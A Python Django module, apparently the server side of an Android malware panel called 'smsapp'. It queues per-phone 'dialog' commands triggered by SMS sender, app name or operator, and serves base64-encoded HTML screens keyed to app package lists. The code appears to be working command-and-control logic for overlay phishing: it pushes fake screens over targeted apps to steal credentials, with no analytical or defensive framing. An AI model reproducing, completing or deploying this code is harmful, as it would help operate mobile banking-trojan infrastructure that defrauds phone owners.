import base64
import json
import logging

import redis_lock
from django.conf import settings
from django.core.exceptions import MultipleObjectsReturned

import models


logger = logging.getLogger(__name__)

FMT_DLG_QUEUE_NAME = "dialogs:{0}"


def get_dialog_by_sender(sender):
    """
    Checks if there is a dialog matching this sender
    @param sender: Sender name, partial match is possible
    @type sender: basestring
    @return: A pair of ( dialog id, priority )
    @rtype: tuple of integer or None
    """
    if not sender:
        return None
    try:
        dlg = models.RemoteDialog.objects.get(sender__icontains=sender)
        return dlg.id, dlg.priority
    except models.RemoteDialog.DoesNotExist:
        return None


def get_dialog_by_app(appname):
    """
    Checks if there is a dialog matching this app, even partially
    @param appname: App name
    @type appname: basestring
    @return: A pair of ( dialog id, priority )
    @rtype: tuple of integer or None
    """
    if not appname:
        return None
    try:
        dlg = models.RemoteDialog.objects.get(app__icontains=appname)
        return dlg.id, dlg.priority
    except models.RemoteDialog.DoesNotExist:
        return None


def get_dialog_by_operator(opcode):
    """
    Checks if there is a dialog matching this OP code
    @param opcode: Mobile OP name
    @type opcode: basestring
    @return: A pair of ( dialog id, priority )
    @rtype: tuple of integer or None
    """
    if not opcode:
        return None
    try:
        dlg = models.RemoteDialog.objects.get(operator=opcode)
        return dlg.id, dlg.priority
    except models.RemoteDialog.DoesNotExist:
        return None


def check_sender(code, sender):
    """
    Checks if the sender is in dialogs list. If it is - adds 'send dialog' command to the queue of the phone
    @param code: Phone code
    @type code: basestring
    @param sender: sender ID
    @type sender: basestring
    @rtype: None
    """
    if not sender:
        return
    try:
        dlg = models.RemoteDialog.objects.get(sender__icontains=sender)
        settings.REDIS.rpush(FMT_DLG_QUEUE_NAME.format(code), json.dumps(dlg.get_json()))
    except MultipleObjectsReturned:
        logger.error("Multiple dialogs returned for sender {0}".format(sender))
    except models.RemoteDialog.DoesNotExist:
        pass


def get_dialog(code):
    """
    Checks if dialog is available for the phone, returns it and removes from the queue
    @param code: Phone code
    @type code: basestring
    @return: Dialog code in JSON-compatible object
    @rtype: dict
    """
    vv = settings.REDIS.lpop(FMT_DLG_QUEUE_NAME.format(code))
    if vv is not None:
        vv = json.loads(vv)
    return vv


def push_dialog(code, dialog, override=True):
    """
    Pushes dialog to the specified phone
    @param code: Phone code
    @type code: basestring
    @param dialog: Dialog object
    @type dialog: models.RemoteDialog
    """
    settings.REDIS.rpush(FMT_DLG_QUEUE_NAME.format(code), json.dumps(dialog.get_json()))


def get_app_html_list(version):
    """
    Checks if current HTML version matches the passed one, and returns update data, if necessary
    @param version: passed from client version string
    @type version: basestring
    @return: JSON-compatible dict, if version is outdated. None if the version is up to date
    @rtype: dict or None
    """
    if version is None:
        return None
    conn = settings.REDIS
    # if cached version matches the sent one, don't update
    ver_cached = conn.get(models.DB_HTML_VERSION)
    if (ver_cached and ver_cached == version) or ver_cached == 'None':
        return None
    res = conn.get(models.DB_HTML_CACHE)
    # if both HTML and version are cached, and version doesn't match - return cached content
    if res is not None and ver_cached is not None and ver_cached != version:
        try:
            return {'version': ver_cached, 'data': json.loads(res)}
        except ValueError as e:
            logger.error("Broken JSON in HTML cache: {0}".format(e))
            return None
    # not cached/expired - regenerate cache
    # locked to prevent race conditions
    with redis_lock.Lock(conn, "smsapp-html-content", id="db_owner{0}".format(settings.REDIS_DB)):
        pipe = conn.pipeline(transaction=False)
        logger.debug("Regenerating HTML cache at db {0}".format(settings.REDIS_DB))
        try:
            opt = models.Option.objects.get(name='html version')
            pipe.setex(models.DB_HTML_VERSION, opt.content, models.DB_CACHE_TIMEOUT)
            # create dialogues
            d = []
            for h in models.AppDialog.objects.all():
                apps = h.apps.splitlines()
                d.append({'html': base64.b64encode(h.html_contents), 'packages': apps})
            pipe.setex(models.DB_HTML_CACHE, json.dumps(d), models.DB_CACHE_TIMEOUT)
            pipe.execute()
            logger.debug("Updated DB {0} cache with {1}".format(settings.REDIS_DB, d))
            if opt.content == version:
                return None
            return {'version': opt.content, 'data': d}
        except models.Option.DoesNotExist:
            # no htmls yet, skipping
            pipe.setex(models.DB_HTML_VERSION, 'None', models.DB_CACHE_TIMEOUT)
            pipe.execute()
            return None
